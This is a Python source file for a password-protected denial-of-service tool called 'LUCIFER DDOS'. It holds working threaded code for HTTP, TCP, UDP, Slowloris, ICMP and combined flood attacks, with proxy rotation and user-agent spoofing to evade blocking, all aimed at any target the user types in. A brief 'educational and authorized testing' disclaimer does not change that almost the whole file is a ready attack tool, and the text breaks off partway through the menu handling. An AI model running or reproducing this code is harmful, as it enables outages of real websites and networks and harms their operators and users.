#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import threading
import random
import socket
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Configuration
DDOS_PASSWORD_HASH = "7797b4237da3248b8b85feb361ea661afc2d34f272e596197c217c9318521949"


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    clear_screen()
    print(f"""{RED}
██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ ██████╗  ██████╗ ███████╗
██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝██║  ██║██║   ██║███████╗
██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗██║  ██║██║   ██║╚════██║
███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║██████╔╝╚██████╔╝███████║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
{RESET}{BLUE}
              ╔══════════════════════════════════════╗
              ║            LUCIFER DDOS             ║
              ║           [Professional Edition]    ║
              ║         Developed by Foysal         ║
              ╚══════════════════════════════════════╝
{RESET}""")


def password_prompt():
    print(f"\n{YELLOW}[!] LUCIFER DDOS is password protected.{RESET}")
    attempts = 3
    while attempts > 0:
        pw = input(f"{CYAN}[?] Enter password: {RESET}")
        entered_hash = hashlib.sha256(pw.encode()).hexdigest()

        if entered_hash == DDOS_PASSWORD_HASH:
            print(f"{GREEN}[+] Access Granted to LUCIFER DDOS!{RESET}")
            time.sleep(1)
            return True
        else:
            attempts -= 1
            print(f"{RED}[-] Incorrect Password! {attempts} attempts remaining{RESET}")

    print(f"{RED}[!] Maximum attempts reached. Exiting...{RESET}")
    return False


class DDoSTools:
    def __init__(self):
        self.attack_running = False
        self.requests_sent = 0
        self.packets_sent = 0
        self.proxies = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        ]

    def show_stats(self):
        print(f"""
{CYAN}[=== SYSTEM STATISTICS ===]{RESET}
{GREEN}• Proxies Loaded:{RESET} {len(self.proxies)}
{GREEN}• User Agents:{RESET} {len(self.user_agents)}
{GREEN}• Thread Capacity:{RESET} High
{GREEN}• Attack Methods:{RESET} HTTP Flood, TCP Flood, UDP Flood, Slowloris, ICMP Flood, Mixed Attack
        """)

    def parse_proxy(self, proxy_string):
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                return {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'https://{username}:{password}@{host}:{port}'
                }
            elif len(parts) == 2:
                host, port = parts
                return {
                    'http': f'http://{host}:{port}',
                    'https': f'https://{host}:{port}'
                }
        except:
            pass
        return None

    def load_proxies(self):
        print(f"\n{CYAN}[=== PROXY MANAGEMENT ===]{RESET}")
        print(f"{YELLOW}[!] Supported formats:{RESET}")
        print(f"{YELLOW}    • host:port:username:password (with auth){RESET}")
        print(f"{YELLOW}    • host:port (without auth){RESET}")
        print(f"{YELLOW}[!] Enter 'done' when finished{RESET}")

        self.proxies = []
        proxy_count = 0

        while True:
            proxy_input = input(f"{CYAN}[?] Enter proxy ({proxy_count} loaded): {RESET}").strip()

            if proxy_input.lower() == 'done' or proxy_input == '':
                break

            proxy = self.parse_proxy(proxy_input)
            if proxy:
                self.proxies.append(proxy)
                proxy_count += 1
                print(f"{GREEN}[+] Proxy #{proxy_count} added successfully{RESET}")
            else:
                print(f"{RED}[-] Invalid proxy format!{RESET}")

        print(f"{GREEN}[+] Total {proxy_count} proxies loaded{RESET}")

        if proxy_count > 0:
            print(f"{YELLOW}[!] Testing proxies...{RESET}")
            working_proxies = self.test_proxies()
            print(f"{GREEN}[+] {working_proxies}/{proxy_count} proxies are working{RESET}")

        input(f"{YELLOW}Press Enter to continue...{RESET}")

    def test_proxies(self):
        working_count = 0
        print(f"{CYAN}[Testing proxies...]{RESET}")

        for i, proxy in enumerate(self.proxies):
            try:
                response = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=10)
                if response.status_code == 200:
                    working_count += 1
                    print(f"{GREEN}[✓] Proxy {i + 1}: Working{RESET}")
                else:
                    print(f"{RED}[✗] Proxy {i + 1}: Failed{RESET}")
            except:
                print(f"{RED}[✗] Proxy {i + 1}: Failed{RESET}")

        return working_count

    def get_random_proxy(self):
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def http_flood(self, target, duration, threads_count):
        print(f"\n{CYAN}[=== HTTP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target URL:{RESET} {target}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[🔌] Active Proxies:{RESET} {len(self.proxies)}")
        print(f"{YELLOW}[⚡] Attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] ATTACK STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Establishing connections to target...{RESET}")

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    proxy = self.get_random_proxy()
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                    }

                    if proxy:
                        response = requests.get(target, headers=headers, proxies=proxy, timeout=8)
                    else:
                        response = requests.get(target, headers=headers, timeout=8)

                    with lock:
                        self.requests_sent += 1
                        req_num = self.requests_sent

                    # Success logs with hacker style
                    if req_num % 10 == 0:  # Show every 10th request
                        elapsed = time.time() - start_time
                        rps = req_num / elapsed if elapsed > 0 else 0

                        # Random success messages
                        success_messages = [
                            f"{GREEN}[✅] Packet #{req_num} delivered | Status: {response.status_code} | RPS: {rps:.1f}{RESET}",
                            f"{GREEN}[🚀] Request #{req_num} successful | Code: {response.status_code} | Speed: {rps:.1f}/s{RESET}",
                            f"{GREEN}[💥] Payload #{req_num} sent | Response: {response.status_code} | Rate: {rps:.1f} req/s{RESET}",
                            f"{GREEN}[⚡] Connection #{req_num} established | HTTP: {response.status_code} | Power: {rps:.1f} RPS{RESET}",
                            f"{GREEN}[🔧] Data packet #{req_num} transmitted | Status: {response.status_code} | Flow: {rps:.1f}/s{RESET}",
                        ]

                        print(f"{random.choice(success_messages)}")

                except Exception as e:
                    with lock:
                        self.requests_sent += 1

        # Create and start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Real-time statistics display
        print(f"{CYAN}[📊] Initializing real-time monitoring...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rps = self.requests_sent / elapsed

                    # Progress bar style display
                    progress = (elapsed / duration) * 100
                    bars = "█" * int(progress / 5)
                    spaces = " " * (20 - len(bars))

                    stats_messages = [
                        f"{CYAN}[📈] Progress: [{bars}{spaces}] {progress:.1f}% | Reqs: {self.requests_sent} | RPS: {rps:.1f}{RESET}",
                        f"{BLUE}[🌊] Flooding: [{bars}{spaces}] {progress:.1f}% | Sent: {self.requests_sent} | Rate: {rps:.1f}/s{RESET}",
                        f"{MAGENTA}[💫] Streaming: [{bars}{spaces}] {progress:.1f}% | Packets: {self.requests_sent} | Speed: {rps:.1f} RPS{RESET}",
                    ]

                    print(f"{random.choice(stats_messages)}", end='\r')

                time.sleep(0.5)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(2)

        # Final attack report
        print(f"\n{CYAN}[=== ATTACK COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] Mission accomplished!{RESET}")
        print(f"{GREEN}[📊] Total requests sent:{RESET} {self.requests_sent}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[⚡] Average RPS:{RESET} {self.requests_sent / total_time:.1f}")
        print(f"{GREEN}[🎯] Target impacted:{RESET} {target}")
        print(f"{RED}[🔥] Attack finished at: {time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

    def tcp_flood(self, target, port, duration, threads_count, packet_size=1024):
        print(f"\n{CYAN}[=== TCP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}:{port}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[📦] Packet Size:{RESET} {packet_size} bytes")
        print(f"{YELLOW}[⚡] Attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] TCP FLOOD STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Establishing TCP connections...{RESET}")

        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))

                    # Send random data
                    data = os.urandom(packet_size)
                    sock.send(data)
                    sock.close()

                    with lock:
                        self.packets_sent += 1
                        packet_num = self.packets_sent

                    # Success logs
                    if packet_num % 15 == 0:
                        elapsed = time.time() - start_time
                        pps = packet_num / elapsed if elapsed > 0 else 0

                        success_messages = [
                            f"{GREEN}[🔗] TCP Packet #{packet_num} delivered | PPS: {pps:.1f}{RESET}",
                            f"{GREEN}[⚡] Connection #{packet_num} established | Speed: {pps:.1f} packets/s{RESET}",
                            f"{GREEN}[💥] TCP Stream #{packet_num} successful | Rate: {pps:.1f} PPS{RESET}",
                            f"{GREEN}[🌊] Data chunk #{packet_num} sent | Flow: {pps:.1f}/s{RESET}",
                        ]

                        print(f"{random.choice(success_messages)}")

                except Exception:
                    with lock:
                        self.packets_sent += 1

        # Create and start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack progress
        print(f"{CYAN}[📊] Initializing TCP flood monitoring...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    pps = self.packets_sent / elapsed
                    progress = (elapsed / duration) * 100
                    bars = "█" * int(progress / 5)
                    spaces = " " * (20 - len(bars))

                    print(
                        f"{BLUE}[🔗] TCP Progress: [{bars}{spaces}] {progress:.1f}% | Packets: {self.packets_sent} | PPS: {pps:.1f}{RESET}",
                        end='\r')
                time.sleep(0.5)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(2)

        print(f"\n{CYAN}[=== TCP FLOOD COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] TCP Flood finished!{RESET}")
        print(f"{GREEN}[📊] Total packets sent:{RESET} {self.packets_sent}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[⚡] Average PPS:{RESET} {self.packets_sent / total_time:.1f}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}:{port}")

    def udp_flood(self, target, port, duration, threads_count, packet_size=1024):
        print(f"\n{CYAN}[=== UDP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}:{port}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[📦] Packet Size:{RESET} {packet_size} bytes")
        print(f"{YELLOW}[⚡] Attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] UDP FLOOD STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Sending UDP packets to target...{RESET}")

        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = os.urandom(packet_size)
                    sock.sendto(data, (target, port))
                    sock.close()

                    with lock:
                        self.packets_sent += 1
                        packet_num = self.packets_sent

                    # Success logs
                    if packet_num % 20 == 0:
                        elapsed = time.time() - start_time
                        pps = packet_num / elapsed if elapsed > 0 else 0

                        success_messages = [
                            f"{GREEN}[🌀] UDP Packet #{packet_num} delivered | PPS: {pps:.1f}{RESET}",
                            f"{GREEN}[💨] Datagram #{packet_num} sent | Speed: {pps:.1f} packets/s{RESET}",
                            f"{GREEN}[🌪️] UDP Flood #{packet_num} successful | Rate: {pps:.1f} PPS{RESET}",
                            f"{GREEN}[⚡] Connectionless #{packet_num} transmitted | Flow: {pps:.1f}/s{RESET}",
                        ]

                        print(f"{random.choice(success_messages)}")

                except Exception:
                    with lock:
                        self.packets_sent += 1

        # Start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor progress
        print(f"{CYAN}[📊] Initializing UDP flood monitoring...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    pps = self.packets_sent / elapsed
                    progress = (elapsed / duration) * 100
                    bars = "█" * int(progress / 5)
                    spaces = " " * (20 - len(bars))

                    print(
                        f"{BLUE}[🌊] UDP Progress: [{bars}{spaces}] {progress:.1f}% | Packets: {self.packets_sent} | PPS: {pps:.1f}{RESET}",
                        end='\r')
                time.sleep(0.5)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(2)

        print(f"\n{CYAN}[=== UDP FLOOD COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] UDP Flood finished!{RESET}")
        print(f"{GREEN}[📊] Total packets sent:{RESET} {self.packets_sent}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[⚡] Average PPS:{RESET} {self.packets_sent / total_time:.1f}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}:{port}")

    def slowloris_attack(self, target, duration, threads_count, sockets_per_thread=10):
        print(f"\n{CYAN}[=== SLOWLORIS ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target URL:{RESET} {target}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[🔌] Sockets per thread:{RESET} {sockets_per_thread}")
        print(f"{YELLOW}[⚡] Attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] SLOWLORIS STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Opening partial connections...{RESET}")

        self.attack_running = True
        self.connections_open = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            sockets = []

            # Create sockets
            for _ in range(sockets_per_thread):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)

                    # Parse target
                    if target.startswith('http://'):
                        host = target[7:].split('/')[0]
                    elif target.startswith('https://'):
                        host = target[8:].split('/')[0]
                    else:
                        host = target.split('/')[0]

                    port = 80
                    if ':' in host:
                        host, port = host.split(':')
                        port = int(port)

                    sock.connect((host, port))

                    # Send partial request
                    partial_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()
                    sock.send(partial_request)
                    sockets.append(sock)

                    with lock:
                        self.connections_open += 1

                except Exception:
                    continue

            # Keep connections alive
            while self.attack_running and (time.time() - start_time) < duration:
                for sock in sockets:
                    try:
                        # Send keep-alive headers slowly
                        keep_alive = f"X-a: {random.randint(1, 1000)}\r\n".encode()
                        sock.send(keep_alive)
                        time.sleep(10)  # Slow sending
                    except Exception:
                        # Reconnect if socket closed
                        try:
                            sock.close()
                        except:
                            pass
                        sockets.remove(sock)
                        with lock:
                            self.connections_open -= 1
                        break

                # Log status
                with lock:
                    if self.connections_open % 5 == 0:
                        print(f"{GREEN}[🐢] Slowloris active | Open connections: {self.connections_open}{RESET}")

            # Cleanup
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

        # Start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor progress
        print(f"{CYAN}[📊] Monitoring Slowloris attack...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                progress = (elapsed / duration) * 100
                bars = "█" * int(progress / 5)
                spaces = " " * (20 - len(bars))

                print(
                    f"{MAGENTA}[🐢] Slowloris: [{bars}{spaces}] {progress:.1f}% | Connections: {self.connections_open}{RESET}",
                    end='\r')
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(3)

        print(f"\n{CYAN}[=== SLOWLORIS COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] Slowloris attack finished!{RESET}")
        print(f"{GREEN}[📊] Max connections opened:{RESET} {self.connections_open}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[🎯] Target:{RESET} {target}")

    def icmp_flood(self, target, duration, threads_count, packet_size=64):
        print(f"\n{CYAN}[=== ICMP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[📦] Packet Size:{RESET} {packet_size} bytes")
        print(f"{YELLOW}[⚡] Attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] ICMP FLOOD STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Sending ICMP packets...{RESET}")

        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    # Create ICMP packet (ping)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    packet = os.urandom(packet_size)
                    sock.sendto(packet, (target, 0))
                    sock.close()

                    with lock:
                        self.packets_sent += 1
                        packet_num = self.packets_sent

                    # Success logs
                    if packet_num % 25 == 0:
                        elapsed = time.time() - start_time
                        pps = packet_num / elapsed if elapsed > 0 else 0

                        success_messages = [
                            f"{GREEN}[📡] ICMP Packet #{packet_num} sent | PPS: {pps:.1f}{RESET}",
                            f"{GREEN}[💫] Ping #{packet_num} delivered | Speed: {pps:.1f} packets/s{RESET}",
                            f"{GREEN}[🌐] ICMP Flood #{packet_num} successful | Rate: {pps:.1f} PPS{RESET}",
                        ]

                        print(f"{random.choice(success_messages)}")

                except Exception as e:
                    # ICMP requires root privileges on most systems
                    if "Operation not permitted" in str(e):
                        print(f"{RED}[❌] ICMP flood requires root/admin privileges!{RESET}")
                        break
                    with lock:
                        self.packets_sent += 1

        # Start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor progress
        print(f"{CYAN}[📊] Monitoring ICMP flood...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    pps = self.packets_sent / elapsed
                    progress = (elapsed / duration) * 100
                    bars = "█" * int(progress / 5)
                    spaces = " " * (20 - len(bars))

                    print(
                        f"{BLUE}[📡] ICMP Progress: [{bars}{spaces}] {progress:.1f}% | Packets: {self.packets_sent} | PPS: {pps:.1f}{RESET}",
                        end='\r')
                time.sleep(0.5)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(2)

        print(f"\n{CYAN}[=== ICMP FLOOD COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] ICMP Flood finished!{RESET}")
        print(f"{GREEN}[📊] Total packets sent:{RESET} {self.packets_sent}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[⚡] Average PPS:{RESET} {self.packets_sent / total_time:.1f}")

    def mixed_attack(self, target, duration, threads_count):
        print(f"\n{CYAN}[=== MIXED ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}")
        print(f"{GREEN}[⏱️] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[🧵] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[🔌] Attack Types:{RESET} HTTP + TCP + UDP")
        print(f"{YELLOW}[⚡] Combined attack commencing in 5 seconds...{RESET}")

        for i in range(5, 0, -1):
            print(f"{RED}[🔥] Launching in {i}...{RESET}", end='\r')
            time.sleep(1)

        print(f"{RED}[🚀] MIXED ATTACK STARTED! Press Ctrl+C to stop{RESET}")
        print(f"{CYAN}[📡] Deploying multiple attack vectors...{RESET}")

        self.attack_running = True
        self.total_requests = 0
        start_time = time.time()
        lock = threading.Lock()

        def http_attacker():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    headers = {'User-Agent': self.get_random_user_agent()}
                    proxy = self.get_random_proxy()

                    if proxy:
                        requests.get(target, headers=headers, proxies=proxy, timeout=5)
                    else:
                        requests.get(target, headers=headers, timeout=5)

                    with lock:
                        self.total_requests += 1

                except Exception:
                    with lock:
                        self.total_requests += 1

        def tcp_attacker():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    # Parse host and port from target
                    if target.startswith('http://'):
                        host = target[7:].split('/')[0]
                    elif target.startswith('https://'):
                        host = target[8:].split('/')[0]
                    else:
                        host = target.split('/')[0]

                    port = 80
                    if ':' in host:
                        host, port = host.split(':')
                        port = int(port)

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((host, port))
                    sock.send(os.urandom(512))
                    sock.close()

                    with lock:
                        self.total_requests += 1

                except Exception:
                    with lock:
                        self.total_requests += 1

        def udp_attacker():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    host = target.split('//')[-1].split('/')[0].split(':')[0]
                    port = 80

                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(os.urandom(512), (host, port))
                    sock.close()

                    with lock:
                        self.total_requests += 1

                except Exception:
                    with lock:
                        self.total_requests += 1

        # Start mixed attack threads
        threads = []
        for i in range(threads_count):
            # Distribute threads among different attack types
            if i % 3 == 0:
                thread = threading.Thread(target=http_attacker)
            elif i % 3 == 1:
                thread = threading.Thread(target=tcp_attacker)
            else:
                thread = threading.Thread(target=udp_attacker)

            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor progress
        print(f"{CYAN}[📊] Monitoring mixed attack...{RESET}")

        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rps = self.total_requests / elapsed
                    progress = (elapsed / duration) * 100
                    bars = "█" * int(progress / 5)
                    spaces = " " * (20 - len(bars))

                    attack_types = ["HTTP", "TCP", "UDP"]
                    current_type = attack_types[int(elapsed) % 3]

                    print(
                        f"{MAGENTA}[🎭] Mixed Attack: [{bars}{spaces}] {progress:.1f}% | Total: {self.total_requests} | RPS: {rps:.1f} | Mode: {current_type}{RESET}",
                        end='\r')

                    # Show success logs
                    if self.total_requests % 30 == 0:
                        print(
                            f"{GREEN}[⚡] Combined attack successful | Total requests: {self.total_requests} | RPS: {rps:.1f}{RESET}")

                time.sleep(0.5)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[⚠️] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time

        # Wait for threads to finish
        time.sleep(2)

        print(f"\n{CYAN}[=== MIXED ATTACK COMPLETED ===]{RESET}")
        print(f"{GREEN}[✅] Combined attack finished!{RESET}")
        print(f"{GREEN}[📊] Total requests sent:{RESET} {self.total_requests}")
        print(f"{GREEN}[⏱️] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[⚡] Average RPS:{RESET} {self.total_requests / total_time:.1f}")
        print(f"{GREEN}[🎯] Target:{RESET} {target}")

    def show_menu(self):
        print(f"""
{CYAN}[=== LUCIFER DDOS MENU ===]{RESET}
{CYAN}[1]{RESET} HTTP Flood Attack
{CYAN}[2]{RESET} TCP Flood Attack  
{CYAN}[3]{RESET} UDP Flood Attack
{CYAN}[4]{RESET} Slowloris Attack
{CYAN}[5]{RESET} ICMP Flood Attack
{CYAN}[6]{RESET} Mixed Attack
{CYAN}[7]{RESET} Load Proxies ({len(self.proxies)} loaded)
{CYAN}[8]{RESET} System Statistics
{CYAN}[9]{RESET} About LUCIFER DDOS
{CYAN}[0]{RESET} Exit
    """)

    def about(self):
        print(f"""
{CYAN}[=== ABOUT LUCIFER DDOS ===]{RESET}
{GREEN}Version:{RESET} Professional Edition 2.0
{GREEN}Developer:{RESET} Foysal
{GREEN}Purpose:{RESET} Educational & Penetration Testing
{GREEN}Features:{RESET}
  • HTTP Flood Attack
  • TCP Flood Attack  
  • UDP Flood Attack
  • Slowloris Attack
  • ICMP Flood Attack
  • Mixed Combined Attack
  • Proxy Support
  • Multi-threading
  • User Agent Rotation
{GREEN}Platforms:{RESET} Termux, Kali Linux, Windows
{YELLOW}Warning:{RESET} For authorized testing only!
{RED}Disclaimer:{RESET} Misuse of this tool is prohibited.
        """)

    def main(self):
        if not password_prompt():
            return

        while True:
            banner()
            self.show_menu()
            choice = input(f"{YELLOW}[?] Select option: {RESET}")

            if choice == '1':
                print(f"\n{CYAN}[=== HTTP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target URL (http://example.com): ").strip()
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target

                try:
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 50): ") or "50")

                    if threads > 1000:
                        print(f"{RED}[!] Thread count too high! Using 1000 threads maximum.{RESET}")
                        threads = 1000

                    self.http_flood(target, duration, threads)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '2':
                print(f"\n{CYAN}[=== TCP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target IP: ").strip()
                try:
                    port = int(input("[?] Enter target port: "))
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 50): ") or "50")
                    packet_size = int(input("[?] Enter packet size in bytes (default 1024): ") or "1024")

                    if threads > 1000:
                        print(f"{RED}[!] Thread count too high! Using 1000 threads maximum.{RESET}")
                        threads = 1000

                    self.tcp_flood(target, port, duration, threads, packet_size)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '3':
                print(f"\n{CYAN}[=== UDP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target IP: ").strip()
                try:
                    port = int(input("[?] Enter target port: "))
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 50): ") or "50")
                    packet_size = int(input("[?] Enter packet size in bytes (default 1024): ") or "1024")

                    self.udp_flood(target, port, duration, threads, packet_size)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '4':
